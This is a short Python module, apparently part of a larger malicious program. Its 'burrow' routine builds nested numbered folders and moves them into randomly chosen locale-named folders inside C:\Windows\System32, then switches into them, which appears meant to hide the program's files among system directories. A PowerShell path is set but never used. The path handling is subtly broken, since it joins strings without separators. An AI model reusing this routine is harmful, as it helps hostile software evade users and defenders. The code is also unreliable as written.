import subprocess,os,random,shutil

PSpath = r"C:\Windows\System32\WindowsPowerShell\v1.0"

def burrow(currentPath):
    global burrowFlag
    burrowFlag = False
    destPath = getNewPath()
    mkDir()
    if(getmade66DirFlag()):
        mergePath = '6666/666/66/6'
        finaldestPath = destPath + mergePath
        shutil.move(mergePath,destPath)
        os.chdir(finaldestPath)
        burrowFlag = True
    elif(getmade69DirFlag()):
        mergePath = '6969/696/69/6'
        finaldestPath = destPath + mergePath
        shutil.move(mergePath,destPath)
        os.chdir(finaldestPath)
        burrowFlag = True
    else:
        pass

    #os.chdir(getNewPath())
    #print(currentPath)

def getNewPath():
    num = random.randint(1,3)
    path = ''
    if num == 1:
        path += r"C:\Windows\System32\1029"
    elif num == 2:
        path += r"C:\Windows\System32\1036"
    else:
        path += r"C:\Windows\System32\1055"
    return path

def mkDir():
    global made66DirFlag,made69DirFlag
    made66DirFlag = False
    made69DirFlag = False
    try:
        os.mkdir('6666')
        os.makedirs('6666/666/66/6')
        made66DirFlag = True
    except:
        try:
            os.mkdir('6969')
            os.makedirs('6969/696/69/6')
            made69DirFlag = True
        except:
            pass

def getmade66DirFlag():
    return made66DirFlag

def getmade69DirFlag():
    return made69DirFlag

def getBurrowFlag():
    return burrowFlag

